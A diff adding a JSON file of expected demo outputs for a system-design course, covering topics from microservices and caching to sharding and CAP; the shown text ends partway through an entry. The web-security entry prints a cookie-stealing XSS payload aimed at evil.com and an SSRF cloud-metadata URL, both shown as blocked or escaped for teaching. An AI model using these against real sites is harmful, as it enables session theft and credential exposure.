@@ -1,0 +1,678 @@
+{
+ "monolith-microservices": {
+  "h": "7262bfb2b1e903d80f32e0b698c86a29ba5a37ad",
+  "out": "monolith      : order placed (2 in-process calls, ~0 ms, one DB transaction)\nmicroservices : 20 checkouts -> 17 ok, 3 hit a network failure, 114 ms spent on network hops\nso microservices need timeouts, retries, idempotency and sagas; in return each service deploys and scales on its own."
+ },
+ "service-discovery": {
+  "h": "a1e0f91817f6e76ba4ffafe34dea71e65c6b7d2a",
+  "out": "t=0  payment -> [10.0.3.7:8080, 10.0.3.9:8080]\nt=12 payment -> [10.0.3.9:8080] (10.0.3.7 missed heartbeats, removed)\nt=14 payment -> [10.0.3.9:8080, 10.0.4.2:8080]\n  order-svc call 1 -> 10.0.3.9:8080  (client-side round robin)\n  order-svc call 2 -> 10.0.4.2:8080  (client-side round robin)\n  order-svc call 3 -> 10.0.3.9:8080  (client-side round robin)\n  order-svc call 4 -> 10.0.4.2:8080  (client-side round robin)"
+ },
+ "service-mesh": {
+  "h": "4f5a8359d50e285024999412b74da7b2fd4201b0",
+  "out": "order -> payment: 200 charged (attempt 1, mTLS spiffe://shop/order->spiffe://shop/payment)\norder -> payment: 200 charged (attempt 2, mTLS spiffe://shop/order->spiffe://shop/payment)\norder -> payment: 200 charged (attempt 3, mTLS spiffe://shop/order->spiffe://shop/payment)\norder -> payment: 200 charged (attempt 1, mTLS spiffe://shop/order->spiffe://shop/payment)\norder -> payment: 200 charged (attempt 2, mTLS spiffe://shop/order->spiffe://shop/payment)\nsearch -> payment: 403 denied by mesh policy (search may not call payment)\nsidecar metrics to payment: ok=5 errors=4"
+ },
+ "bff": {
+  "h": "c4d2cdff6cc24aeda4284f6fd56abf8783030b99",
+  "out": "without BFF: phone makes 3 calls one after another, ~120 ms, payload 151 chars\nwith BFF   : 1 call, BFF fans out in parallel, ~50 ms, payload 51 chars -> {lastOrder=order-987, name=Asha, recs=[socks, cap]}\n(on a phone each extra round trip also costs ~100+ ms of mobile network latency)"
+ },
+ "event-driven": {
+  "h": "b5911b95ca6e01cc4c0dc254ae8d857dcfc05541",
+  "out": "order-svc publishes OrderPlaced (a real bus is asynchronous; here handlers run inline so the output is in order):\n  payment-svc : charging order 987\n  warehouse   : pick & pack order 987\n  email-svc   : 'your order is on the way'\n  email-svc   : receipt sent for order 987\n  analytics   : +1 order, Rs 2499\nevent log: [OrderPlaced, PaymentSucceeded, OrderShipped]\nadding a new 'loyalty points' service = one more subscribe(...), no change to order-svc."
+ },
+ "event-sourcing": {
+  "h": "fec46b05c8cc5301fcb4090813aaac36b6ea30d0",
+  "out": "withdraw 2000 rejected: balance 750\n#1 Opened[owner=asha]  -> balance 0\n#2 Deposited[amount=1000]  -> balance 1000\n#3 Withdrew[amount=300]  -> balance 700\n#4 Deposited[amount=50]  -> balance 750\n#5 Withdrew[amount=200]  -> balance 550\ncurrent state: Account[owner=asha, balance=550, version=5]\ntime travel, state after event #3: Account[owner=asha, balance=700, version=3]\nnew read model built later by replaying: total deposited = 1050"
+ },
+ "cqrs": {
+  "h": "c6eae6a09cc3b075380e3a3210b6cd4e682870a7",
+  "out": "right after the 3rd command, user 42 view: [shoes#1]  <- not projected yet (lag)\nafter projector runs   , user 42 view: [shoes#1, socks#3]\ndashboard view (no joins needed)    : {shoes=4998, socks=199}\nread views can be dropped and rebuilt from events: {7=[shoes#2], 42=[shoes#1, socks#3]}"
+ },
+ "serverless-containers": {
+  "h": "56f5e0b855e635997cc72ab2ad093d989a3fe745",
+  "out": "requests per day: 2,040,000 (spiky)\nserverless (pay per request)        : $3.81/day, scales to zero, cold starts ~400 ms on first requests\ncontainers sized for peak, always on : $3.84/day\ncontainers with autoscaling          : $1.56/day, min 1 instance, no cold start for the base load\nsteady 400k/hour all day             : serverless $17.92 vs containers $3.84 -> containers win at constant high load"
+ },
+ "resilience-patterns": {
+  "h": "8d61a950ced3a3f420ba6b71d55224eb7347acca",
+  "out": "t= 0 CLOSED    fresh recommendations\nt=10 CLOSED    cached top sellers [timeout]\nt=12 CLOSED    cached top sellers [timeout]\n    3 failures in a row -> breaker OPEN at t=14\nt=14 OPEN      cached top sellers [timeout]\nt=16 OPEN      cached top sellers [breaker OPEN, no call made]\nt=20 OPEN      cached top sellers [breaker OPEN, no call made]\n    trial call (HALF-OPEN) failed -> OPEN again at t=46\nt=46 OPEN      cached top sellers [timeout]\nt=62 OPEN      cached top sellers [breaker OPEN, no call made]\n    trial call succeeded -> CLOSED\nt=80 CLOSED    fresh recommendations\nt=82 CLOSED    fresh recommendations\nretry waits with exponential backoff + jitter: 99 ms  7 ms  147 ms  112 ms  193 ms"
+ },
+ "idempotency": {
+  "h": "52267295455044f26f34c24f2a5f1876b53df7db",
+  "out": "first attempt : Response[status=201, body=charge ch_1 for Rs 500]\nclient retry  : Response[status=201, body=charge ch_1 for Rs 500] (same response, no new charge)\n5 concurrent duplicates -> distinct responses [charge ch_2 for Rs 700]\ntotal charges made: 2 (expected 2)"
+ },
+ "deployments": {
+  "h": "73c41d39bb3bf195f78faa46c78eb5f774c4f620",
+  "out": "good release:\n  v2-good    1% on v2: v1 errors 0.10%, v2 errors 0.00%  -> healthy, continue\n  v2-good    5% on v2: v1 errors 0.10%, v2 errors 0.19%  -> healthy, continue\n  v2-good   25% on v2: v1 errors 0.05%, v2 errors 0.10%  -> healthy, continue\n  v2-good   50% on v2: v1 errors 0.11%, v2 errors 0.15%  -> healthy, continue\n  v2-good  100% on v2: v1 errors 0.00%, v2 errors 0.10%  -> healthy, continue\nbad release:\n  v2-bad     1% on v2: v1 errors 0.10%, v2 errors 2.34%  -> ROLLBACK to v1\nthe bad release reached only 1% of users before rollback\nblue-green: live=blue\nblue-green: deploy to green, smoke test, flip router -> live=green\nblue-green: problem found -> flip back instantly -> live=blue"
+ },
+ "config-multitenancy": {
+  "h": "4beba43ecb44c789e94c1693e9c773d398f9d191",
+  "out": "acme /invoices -> [1, 2]\nglobex /invoices -> [3]\nglobex /invoices -> 429 (noisy neighbour contained)\nacme /invoices -> [1, 2] (acme unaffected)\nquery without tenant context -> refused: no tenant in context"
+ },
+ "redundancy-failover": {
+  "h": "93b7422e2ec2a7e868d93197123c1a85af830f9a",
+  "out": "t= 0 app writes go to db-primary  \nt= 5 app writes go to db-primary  \nt=10 app writes go to db-primary  \nt=15 app writes go to db-primary  \nt=20 app writes go to db-primary  \nt=25 primary crashes (lsn 60, standby at 50)\nt=25 app writes go to db-primary  (FAILING: downtime)\nt=30 app writes go to db-primary  (FAILING: downtime)\nt=35 3 health checks failed -> promote standby, move virtual IP -> db-standby\nt=35 app writes go to db-standby  \nt=40 app writes go to db-standby  \nt=45 app writes go to db-standby  \nt=50 app writes go to db-standby  \nt=55 app writes go to db-standby  \nt=60 app writes go to db-standby  \ndowntime ~ detection (3 x 5 s) = 15 s; writes lost because replication was async: 10\nold primary must be fenced (never accept writes again) to avoid split brain."
+ },
+ "disaster-recovery": {
+  "h": "7c0286a950b6f1bfeed567ebb464c5adaae49aa1",
+  "out": "requirement: lose at most 30 min of data, be back within 60 min\n  backup & restore (daily)   RPO  1440 min  RTO  480 min  $   200/month  too slow\n  pilot light                RPO    15 min  RTO   45 min  $ 1,500/month  meets it\n  warm standby               RPO     1 min  RTO   10 min  $ 6,000/month  meets it\n  multi-site active-active   RPO     0 min  RTO    1 min  $20,000/month  meets it\ncheapest that meets it: pilot light\nrestore drill: restored == production? true {a=10, b=2, c=3, d=4}"
+ },
+ "monitoring": {
+  "h": "fcb9f7432391517f6e13e806ef0e1355f3bae00a",
+  "out": "RED  rate=1200 req/min  errors=0.42%  duration p50=70 ms p99=862 ms\nSLO 99.5% -> burn rate 0.83 (ok)\n{\"ts\":\"10:02:03.120\",\"level\":\"INFO\",\"svc\":\"order\",\"req\":\"req-7f3a\",\"msg\":\"checkout start\",\"user\":42}\n{\"ts\":\"10:02:03.520\",\"level\":\"WARN\",\"svc\":\"payment\",\"req\":\"req-7f3a\",\"msg\":\"psp slow\",\"ms\":280}\ntrace req-7f3a:\n  GET /checkout (gateway)    █████████████████████ 420 ms\n    order-svc                ███████████████████ 390 ms\n      inventory.reserve       ███ 60 ms\n      payment.charge             ██████████████ 280 ms\n      db insert                                █ 25 ms\nbottleneck: payment.charge (280 ms)"
+ },
+ "autoscaling": {
+  "h": "f2160ca780918c455e24e9d15c15aa132256cbc3",
+  "out": "min  load  pods  util   action\n  0   200     3   67%  scale up +1 (ready next minute)\n  1   220     4   55%  hold\n  2   600     4  150%  scale up +6 (ready next minute)  <- overloaded while new pods start\n  3  1400    10  140%  scale up +14 (ready next minute)  <- overloaded while new pods start\n  4  1800    24   75%  scale up +6 (ready next minute)\n  5  1800    30   60%  hold\n  6  1700    29   57%  scale down -1\n  7   900    29   31%  would scale down, in cooldown\n  8   400    29   14%  would scale down, in cooldown\n  9   300     5   10%  scale down -24\n 10   250     5   50%  hold\n 11   220     5   44%  would scale down, in cooldown"
+ },
+ "chaos-engineering": {
+  "h": "f6bd4595491989e3b8a1ada0892352b0daeee1ea",
+  "out": "round 1 (no resilience):\n  none                     success 100.0% -> hypothesis holds\n  kill recommendations     success 0.0% -> BROKEN: abort, fix it\n  payment +2s latency      success 70.0% -> BROKEN: abort, fix it\nround 2 (added fallback for recs + timeout/retry for payments):\n  none                     success 100.0% -> hypothesis holds\n  kill recommendations     success 100.0% -> hypothesis holds\n  payment +2s latency      success 100.0% -> hypothesis holds"
+ },
+ "cost": {
+  "h": "aa91e0796428b17566c7ec27685bd491b9093285",
+  "out": "baseline:\n  app servers                              20 x $ 150.0 = $    3,000  (13.6%)\n  database primary + 2 replicas             3 x $1200.0 = $    3,600  (16.4%)\n  object storage                          200 x $  23.0 = $    4,600  (20.9%)\n  CDN egress                              500 x $  20.0 = $   10,000  (45.5%)\n  Redis cache                               2 x $ 400.0 = $      800  ( 3.6%)\n  TOTAL                                                              $   22,000 per month\noptimised:\n  app servers (autoscaled, avg 12)         12 x $ 105.0 = $    1,260  ( 9.5%)\n  database primary + 2 replicas             3 x $1200.0 = $    3,600  (27.2%)\n  object storage hot                       40 x $  23.0 = $      920  ( 7.0%)\n  object storage archive                  160 x $   4.0 = $      640  ( 4.8%)\n  CDN egress (WebP + better caching)      300 x $  20.0 = $    6,000  (45.4%)\n  Redis cache                               2 x $ 400.0 = $      800  ( 6.1%)\n  TOTAL                                                              $   13,220 per month"
+ },
+ "authn-authz": {
+  "h": "d217f07c415313b02b0a50309fd8f2990716ef84",
+  "out": "401 Unauthorized (who are you?)\n200 OK ravi read d1  <- shared with him\n403 Forbidden (ravi may not edit d1)  <- viewer role\n200 OK asha edit d1\n403 Forbidden (asha may not read d2)  <- not hers (broken access control prevented)\n200 OK root delete d2"
+ },
+ "sessions-jwt": {
+  "h": "940da3ed4c13dd808141ab322b8fc65556fd54d3",
+  "out": "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...\nverify at t=500   : OK {\"sub\":\"user-42\",\"exp\":1000} (no database lookup needed)\nforged sub=admin  : REJECT: bad signature (tampered)\nverify at t=1000  : REJECT: expired\nafter logout      : REJECT: on deny-list  (revocation needs a server-side list)\nserver session    : lookup sid-abc -> user-42; logout = delete -> revoked instantly"
+ },
+ "oauth": {
+  "h": "ff998ba9bd703b3cacffb3a89c2345d72056a0dc",
+  "out": "1. app redirects user to auth server with code_challenge=iGvm_wXp9Xyc...\n2. user logs in + consents; redirected back with code-1\n   attacker who stole the code tries: error: PKCE verification failed\n3. app exchanges code-2 + verifier -> access token at-74450e88\n   reusing the same code -> error: invalid or reused code\n4. API call with token -> user asha@gmail.com, allowed scopes [email profile]; password never shared with the app"
+ },
+ "encryption": {
+  "h": "f93fb5afdf2e03449581a54b358e54ca4b708c23",
+  "out": "stored: 42 bytes ciphertext + 48 bytes encrypted data key\nread  : invoice: Rs 2,499 for Asha\npassword hash check: correct=true wrong=false (one-way, slow on purpose)"
+ },
+ "web-security": {
+  "h": "1fbd3fdc0f4004f91a072d8d5636f3a099e186ac",
+  "out": "SQL injection, unsafe : [asha@x.com, ravi@x.com]  <- every user returned\nSQL injection, safe   : []\nXSS, rendered raw     : <script>fetch('//evil.com?c='+document.cookie)</script>\nXSS, escaped          : &lt;script&gt;fetch(&#39;//evil.com?c=&#39;+document.cookie)&lt;/script&gt;\nSSRF check https://images.example.com/cat.jpg -> fetch\nSSRF check http://169.254.169.254/latest/meta-data/ -> BLOCKED (internal address)\nCSRF: form token csrf-0000 vs session csrf-81f2 -> REJECT"
+ },
+ "load-balancer": {
+  "h": "dfed778f278dfb54e999d7d93a688620e7d36a52",
+  "out": "tick 1: req 1 -> app-1 | req 2 -> app-2 | req 3 -> app-3\ntick 2: app-2 crashes\ntick 2: req 4 -> app-1 | req 5 -> app-2 FAILED (not yet detected) | req 6 -> app-3\ntick 3: req 7 -> app-1 | req 8 -> app-2 FAILED (not yet detected) | req 9 -> app-3\n  health: app-2 removed after 3 failed checks\ntick 4: req 10 -> app-1 | req 11 -> app-3 | req 12 -> app-1\ntick 5: req 13 -> app-3 | req 14 -> app-1 | req 15 -> app-3\ntick 6: app-2 restarted\n  health: app-2 back in pool\ntick 6: req 16 -> app-1 | req 17 -> app-2 | req 18 -> app-3\napp-1 served 7\napp-2 served 2\napp-3 served 7"
+ },
+ "lb-algorithms": {
+  "h": "ce68adf8fb17e688ff4566000bd7d2a37ab22cb8",
+  "out": "round robin      : u1→A  u2→B  u3→C  u1→A  u4→B  u5→C  u2→A  u6→B  \nweighted RR      : u1→A  u2→B  u3→C  u1→C  u4→A  u5→B  u2→C  u6→C  \nleast connections: u1→A  u2→B  u3→C  u1→A  u4→B  u5→C  u2→B  u6→C  \nIP/user hash     : u1→B  u2→C  u3→A  u1→B  u4→B  u5→C  u2→C  u6→A  \npower of two     : u1→C  u2→A  u3→A  u1→A  u4→B  u5→B  u2→C  u6→B  \nIP hash always sends u1 and u2 to the same server (sticky); least connections avoids the server busy with the upload."
+ },
+ "cdn": {
+  "h": "09884e1f7f025a0c0e2c55228853452bc395ca48",
+  "out": "Mumbai   MISS /img/cat.jpg           208 ms (went to origin in Virginia)\nMumbai   HIT  /img/cat.jpg             8 ms\nLondon   MISS /img/cat.jpg           210 ms (went to origin in Virginia)\nMumbai   MISS /app.3f9c.js           208 ms (went to origin in Virginia)\n-- deploy: new bundle gets a new versioned name, no purge needed --\nMumbai   MISS /app.8d21.js           208 ms (went to origin in Virginia)\nMumbai   MISS /api/price             208 ms (went to origin in Virginia)  <- dynamic, max-age 0\nMumbai   MISS /img/cat.jpg           208 ms (went to origin in Virginia)  <- next day, expired\norigin served 6 of 8 requests"
+ },
+ "caching": {
+  "h": "6981f77ba99f8fa6369c4c5cede311d95b7465b5",
+  "out": "requests 10,000  cache hits 9,007  hit ratio 90.1%  db reads 993\naverage latency 1.44 ms (vs 10 ms with no cache)\ncache holds 993 keys; most traffic goes to a few hot keys"
+ },
+ "cache-strategies": {
+  "h": "a1860c6c2da4f29d5b6a0fbbf1d5ff369c1270e3",
+  "out": "aside read stock:ps5 MISS -> DB 10\naside read stock:ps5 HIT 10\naside write stock:ps5=9 -> DB, delete cache key\naside read stock:ps5 MISS -> DB 9\nwrite-through stock:ps5=8 -> cache + DB\naside read stock:ps5 HIT 8\nwrite-behind stock:ps5=7 -> cache only (DB=8)\nwrite-behind stock:ps5=6 -> cache only (DB=8)\nwrite-behind stock:xbox=4 -> cache only (DB=null)\nflush 2 dirty keys -> DB={stock:xbox=4, stock:ps5=6}"
+ },
+ "cache-eviction": {
+  "h": "ee485813103b0b6824bc837059743e0944be0376",
+  "out": "LRU  A· B· C· A✓ D· B· A✓ E· A✓ B✓  hits=4 final=[E, A, B]\nFIFO A· B· C· A✓ D· B✓ A· E· A✓ B·  hits=3 final=[A, E, B]\nLFU  A· B· C· A✓ D· B· A✓ E· A✓ B✓  hits=4 final={A=4, B=2, E=1}"
+ },
+ "cache-problems": {
+  "h": "47a91e52db7b9875ef3033f0449b93349d611fa6",
+  "out": "no protection        : 100 concurrent misses -> 30 DB queries\nwith single-flight   : 100 concurrent misses -> 1 DB queries\npenetration fix      : 1000 lookups of a missing id -> 1 DB query (negative caching)\navalanche fix        : TTL 60 min + random 0-9 min -> expiries per minute [1025, 1003, 960, 984, 986, 955, 1024, 998, 1000, 1065]"
+ },
+ "redis-memcached": {
+  "h": "45056b2e4d229d751c60c572cab2461c11a9fd1c",
+  "out": "SET session:abc asha EX 60 -> OK\nINCR views:post:9 x3       -> 1,2,3\nSET lock:order NX EX 5     -> OK\nSET lock:order NX EX 5     -> nil (already locked)\nLRANGE feed:42 0 1         -> [p3, p2]\nZREVRANGE lb 0 1           -> [asha=90, ravi=80]\n61 s later GET session:abc -> null (expired)\n            GET lock:order -> null (lock auto-released)"
+ },
+ "message-queues": {
+  "h": "0e0769280e41e4687fddde060f5ee060f3451b44",
+  "out": "t=0 worker took m1 and crashed (no ACK) -> will reappear after 30 s\nt=31 processed m2 'send email 9' and ACKed\nt=62 worker failed on m3 (receive #1)\nt=93 processed m1 'transcode video 7' and ACKed\nt=124 worker failed on m3 (receive #2)\nt=155 worker failed on m3 (receive #3)\nt=186 queue empty, DLQ=[Msg[id=m3, body=corrupt file]]"
+ },
+ "kafka": {
+  "h": "52a6c52c0422ea90491314e0a8b74ba10c7c3ff5",
+  "out": "produce asha:created -> partition 2\nproduce meera:created -> partition 0\nproduce asha:paid -> partition 2\nproduce zoya:created -> partition 1\nproduce asha:shipped -> partition 2\nproduce meera:paid -> partition 0\npartition 0 = [meera:created, meera:paid]\npartition 1 = [zoya:created]\npartition 2 = [asha:created, asha:paid, asha:shipped]\n\ngroup 'billing' with 2 consumers: {c1=[0, 2], c2=[1]}\n  billing reads p0 [meera:created, meera:paid]\n  billing reads p1 [zoya:created]\n  billing reads p2 [asha:created, asha:paid, asha:shipped]\ngroup 'analytics' reads the same p0 from offset 0: [meera:created] then [meera:paid]\nasha's events stay in order because they share a key -> same partition."
+ },
+ "delivery-semantics": {
+  "h": "8e07b67b6543b2e5bdb930ace1b4f7dd2739ae10",
+  "out": "expected                : {asha=300, ravi=700}\nat-most-once            : {asha=500, ravi=700}\nat-least-once           : {asha=100, ravi=700}\nexactly-once            : {asha=300, ravi=700}\nat-most-once lost m2; at-least-once charged m2 twice; dedup by message id fixes it."
+ },
+ "backpressure": {
+  "h": "2f1730964e0cd9894dae53cb30d88b117e36142b",
+  "out": "unbounded queue            produced ~200  dropped    0  max queue  ~110\nbounded(20), block         produced  ~90  dropped    0  max queue   ~20\nbounded(20), drop/shed     produced ~240  dropped ~130  max queue   ~20\nUnbounded: the backlog (and memory, and latency) keeps growing.\nBlocking: the producer is slowed to the consumer's pace. Dropping: the queue stays small, extra work is shed."
+ },
+ "stream-batch": {
+  "h": "778cbdd383a1074c2769f98cffba603011a4e68d",
+  "out": "batch (all data, run once)   : {cart=2, home=5}\nstream window [0,60) : {cart=1, home=2}\n  late event dropped: Click[page=home, tsSec=45]\nstream window [60,120) : {cart=1, home=1} (flushed at end)\nstream window [120,180) : {home=1} (flushed at end)"
+ },
+ "scheduler-cron": {
+  "h": "3a8cbb82c67a8b5dcde68ae71248348ced1fd971",
+  "out": "t= 0 node-A ran daily-report next at t=60\nt=10 node-B ran cleanup      next at t=40\nt=20 node-A claimed invoice      and CRASHED (lease until t=35)\nt=40 node-A ran cleanup      next at t=70\nt=40 node-A ran invoice      next at t=100\nt=60 node-A ran daily-report next at t=120\nt=70 node-B ran cleanup      next at t=100\ndaily-report ran 2 times\ncleanup ran 3 times\ninvoice ran 1 times"
+ },
+ "storage-types": {
+  "h": "afa6d21f359d83a6500c0bf146b1a47f83409f8e",
+  "out": "API hands the client a pre-signed URL: /videos/7/raw.mp4?expires=900&sig=bfc3e8e671e71618\nclient PUT at t=100 allowed? true\nclient PUT at t=1000 allowed? false (expired)\nmultipart complete -> object size 15 MB, metadata {content-type=video/mp4, owner=user-42}\nLIST prefix videos/7/ -> [videos/7/raw.mp4, videos/7/thumb.jpg]\nKeys look like paths, but the namespace is flat: there are no real folders."
+ },
+ "search-engines": {
+  "h": "01636061c84cacda8e91d223407fbb32f9d525a0",
+  "out": "inverted index:\n  blue -> [2]\n  bundle -> [4]\n  jacket -> [2, 3]\n  red -> [1, 3]\n  run -> [1, 2]\n  shoe -> [1, 4]\n  sock -> [4]\nsearch 'red shoes':\n  doc1(1.34) Red running shoes\n  doc3(0.78) Red jacket\n  doc4(0.67) Shoes and socks bundle\nsearch 'jackets':\n  doc3(0.78) Red jacket\n  doc2(0.67) Blue running jacket"
+ },
+ "timeseries-analytics": {
+  "h": "2090fa36f919efa71ac44ed0d91bc5fa244a1a13",
+  "out": "AVG(price) WHERE year=2025 -> row store 2599.2 (scanned whole records), column store 2599.2\ncolumns touched: row store all 8, column store 2 (6 bytes per row instead of ~80)\ncolumn store was faster (timings vary; the I/O saving on disk is the big win)\ndownsampling: 3600 points -> 60 points; minute 0 avg 43.1%, minute 30 avg 43.8%\ndelta encoding: [1764140000, 1764140010, 1764140020, 1764140031] -> first 1764140000 + deltas [10, 10, 11] (tiny numbers compress well)"
+ },
+ "sql-vs-nosql": {
+  "h": "3e1604dd64263cbe7bd530c42f801b0317c73aa7",
+  "out": "SQL join (3 tables): order 987 by Asha items [Shoes, Socks]\nDocument get(987)  : {items=[{qty=1, product=Shoes}, {qty=3, product=Socks}], status=PAID, customer={name=Asha, id=42}}\n\nAfter rename -> SQL reads the new name from one row: Asha K\nDocument still has the copied old name: Asha (must update every copy)\nAd-hoc report (SUM over all items) is easy in SQL: total revenue = 3495"
+ },
+ "acid": {
+  "h": "4fcd6079a9e14bfd3f94a734d5459a65afa076da",
+  "out": "tx1: COMMIT asha -> ravi 500  balances {asha=500, ravi=700}\ntx2: CRASH after debit was logged, before COMMIT\ntx3: ROLLBACK, balance would go negative (Consistency)\n\nWAL: [tx1 SET asha=500, tx1 SET ravi=700, tx1 COMMIT, tx2 SET ravi=600]\nafter restart, replay committed WAL entries -> {asha=500, ravi=700}\ntx2's half-done debit was ignored (Atomicity); tx1 survived the crash (Durability).\ntotal money before 1200, after 1200"
+ },
+ "isolation-levels": {
+  "h": "794b07a817fe7f14e5cad3a043f7112e4a8e0f7c",
+  "out": "100 withdrawals of 5 from 1000 -> expected 500\nno isolation                           -> wrong (lost updates)\npessimistic lock (SELECT FOR UPDATE)   -> 500 ✔\natomic UPDATE balance = balance - 5    -> 500 ✔\noptimistic (WHERE version = v)         -> 500 ✔"
+ },
+ "indexes": {
+  "h": "37af6bcc5ff0735b36f6c6ff5c6a561b0667f14b",
+  "out": "full scan     : found id 777777 after reading 777,778 rows\ntree index    : found id 777777 in ~20 comparisons (a B+ tree with fan-out 500 needs ~3 page reads)\nrange scan    : emails from 'user0100000' to 'user0100100' -> 100 rows, read in order without scanning the table\ncomposite     : country=IN AND city=Pune -> 83302 rows via prefix seek\ncomposite     : ... AND age >= 30        -> 63224 rows, still a range seek\ncomposite     : city=Pune alone can't use it (not a leftmost prefix) -> full scan\nwrite cost    : each insert now updates the table + 2 indexes"
+ },
+ "storage-engines": {
+  "h": "baf7a781ab7cad6853db436c48830821808580a5",
+  "out": "put apple=1\nput kiwi=2\nput mango=3\n  flush memtable -> SSTable {apple=1, kiwi=2, mango=3}\nput apple=10\nput banana=4\nput kiwi=<tombstone>\n  flush memtable -> SSTable {apple=10, banana=4, kiwi=<tombstone>}\nput plum=5\nSSTables on disk: 2, memtable {plum=5}\nget apple -> 10 (newest version wins)\nget grape -> null, disk reads 0 (Bloom filters skipped files)\n  compaction -> 1 SSTable {apple=10, banana=4, mango=3}\nget kiwi  -> null (deleted by tombstone)"
+ },
+ "nosql-types": {
+  "h": "18450529f6ec63a2a780d651d349b4b81df1c7d4",
+  "out": "key-value   GET session:abc -> {user:42, cart:[sku1]}\ndocument    find tags contains 'sport' -> [Shoes]\nwide-column chat:42 latest 3 -> [msg@1010, msg@1005, msg@1003] (one partition, already sorted)\ngraph       people asha may know (2 hops) -> [kiran, meera]"
+ },
+ "normalization": {
+  "h": "66956c162caed43e05c04c4560d6a1519d59a2cb",
+  "out": "unnormalised: Asha now lives in [Mumbai, Pune]  <- update anomaly\nunnormalised: after deleting order 3, do we know Ravi's city? false\nnormalised  : Asha's city Mumbai; Ravi still known: Ravi in Delhi\n  join -> order 1: Asha (Mumbai) bought Shoes\n  join -> order 2: Asha (Mumbai) bought Socks"
+ },
+ "replication": {
+  "h": "a60fb0f890d814585f1a945fdc1b0e0dc4d89ff7",
+  "out": "read after write from f1: f1(lsn 2) bio=system design fan\nread after write from f2: f2(lsn 1) bio=hello  <- replication lag, stale\nread-your-writes routing picks f1: f1(lsn 2) bio=system design fan\nleader crashed; promote f1 (lsn 2); lost write at lsn 3 because replication was async"
+ },
+ "sharding": {
+  "h": "465e22445466161c39f1e2b2a13c8f1cb5ac84c4",
+  "out": "range sharding, writes from 10,000 new users per shard: [0, 0, 0, 10000]\nhash  sharding, writes from 10,000 new users per shard: [2500, 2499, 2500, 2501]\nrange sharding puts all new users on the last shard (hotspot); hashing spreads them.\norders keyed by user_id: {0=[user42/order9001, user42/order9002, user500123/order9004], 1=[user7/order9003]}\n'all orders of user 42' -> query only shard 0\n'all orders over Rs 1000' -> scatter to all 4 shards and merge (expensive)\ngoing from 4 to 5 shards with hash % N moves 80% of rows (see consistent hashing)"
+ },
+ "consistent-hashing": {
+  "h": "5ca327534aeb6996754ddede0c82d63527396f94",
+  "out": "4 servers, 100 vnodes each, load: {A=25720, B=24845, C=25154, D=24281}\nadd server E: 19.6% of keys moved (ideal 20%), all of them to E? true\nremove server B: its keys spread over the survivors {A=5969, C=7273, D=2624, E=6639}\ncompare: hash % N from 4 to 5 servers moves 80.1% of keys"
+ },
+ "db-scaling-path": {
+  "h": "fe34353924c7c0c7b3ed11b74aabb405671136a3",
+  "out": "target: 30,000 reads/s, 3,000 writes/s\nstart: 1 DB, missing indexes       reads    2,000  writes  1,000  ✘ short on reads + writes\n1 add indexes, fix N+1 queries     reads    5,000  writes  1,500  ✘ short on reads + writes\n2 bigger machine (2x)              reads   10,000  writes  3,000  ✘ short on reads\n3 Redis cache, 80% hit ratio       reads   50,000  writes  3,000  ✔ enough\n4 + 3 read replicas                reads   80,000  writes  3,000  ✔ enough\n5 shard writes across 4 primaries  reads   80,000  writes 12,000  ✔ enough\nDo the cheap steps first; sharding is last because it costs joins, transactions and operations."
+ },
+ "connection-pooling": {
+  "h": "9ddbcd62f0bd88e804746acbe5f1d9a3655ea47e",
+  "out": "200 queries, 16 web threads\n  new connection per query : 200 connections opened, slower\n  pool of 4                : 4 connections opened and reused, faster\n  pool was faster and the database saw 4 connections instead of 200"
+ },
+ "distributed-transactions": {
+  "h": "9e514938f09de88eea874532bc428d5371b2c23a",
+  "out": "Saga 1: stock = 0\n  ✔ create order (PENDING)\n  ✔ charge Rs 2499\n  ✘ reserve 1 item failed -> compensating in reverse order\n    ↺ undo charge Rs 2499\n    ↺ undo create order (PENDING)\n  result: order=CANCELLED wallet=5000 stock=0 events=[OrderCreated, PaymentRefunded, OrderCancelled]\nSaga 2: stock = 3\n  ✔ create order (PENDING)\n  ✔ charge Rs 2499\n  ✔ reserve 1 item\n  ✔ confirm order\n  result: order=CONFIRMED wallet=2501 stock=2 events=[OrderCreated]"
+ },
+ "cdc": {
+  "h": "b2b8ba30e3ce0d1432c3fc9c08c413adc0554f89",
+  "out": "event lsn=1 op=c before=null after={id=987, status=PENDING}\nevent lsn=2 op=c before=null after={id=988, status=PENDING}\nevent lsn=3 op=u before={id=987, status=PENDING} after={id=987, status=PAID}\nevent lsn=4 op=d before={id=988, status=PENDING} after=null\nsearch index now {987=PAID}; cache keys left []\nthe app only wrote to the DB; search and cache stayed in sync from the log."
+ },
+ "blob-metadata": {
+  "h": "dab8ca0be5349c371382fb3baba130944807bccb",
+  "out": "Photo[id=1, owner=42, objectKey=photos/4665fb6ada77, sizeBytes=2000000, sha256=4665fb6ada77, status=READY]\nPhoto[id=2, owner=42, objectKey=photos/027785d351a6, sizeBytes=3000000, sha256=027785d351a6, status=READY]\nPhoto[id=3, owner=7, objectKey=photos/4665fb6ada77, sizeBytes=2000000, sha256=4665fb6ada77, status=READY]  <- same bytes, deduplicated\nobject store holds 2 blobs, 5.0 MB; metadata DB holds 3 small rows\nquery 'photos of user 42' hits only the DB: [1, 2]"
+ },
+ "fallacies": {
+  "h": "a1e2da23b7af78c7acec410c6ad57745168d1336",
+  "out": "retry without idempotency #1       tries=1 result=OK                     charged=500\nretry without idempotency #2       tries=2 result=OK                     charged=1000\nretry without idempotency #3       tries=2 result=OK                     charged=1000\nretry without idempotency #4       tries=3 result=OK                     charged=500\nretry WITH idempotency key #1      tries=1 result=OK                     charged=500\nretry WITH idempotency key #2      tries=2 result=OK                     charged=500\nretry WITH idempotency key #3      tries=3 result=OK (duplicate ignored) charged=500\nretry WITH idempotency key #4      tries=1 result=OK                     charged=500\nWithout a key, a lost reply + retry = charged twice. With a key, retries are safe."
+ },
+ "cap": {
+  "h": "4be53e3415da2cb0b25513e02503326f5b526b63",
+  "out": "== CP ==\nwrite 10 at A: OK on [A, B]\nwrite 20 at C: REJECTED (no majority)\nread at C: ERROR (can't guarantee latest)\nread at B: 10\nafter healing (last write wins): A=10 B=10 C=10\n== AP ==\nwrite 10 at A: OK on [A, B]\nwrite 20 at C: OK on [C]\nread at C: 20\nread at B: 10\nafter healing (last write wins): A=20 B=20 C=20"
+ },
+ "pacelc": {
+  "h": "17610cadb9ee82e0e226269b3305be53841149e2",
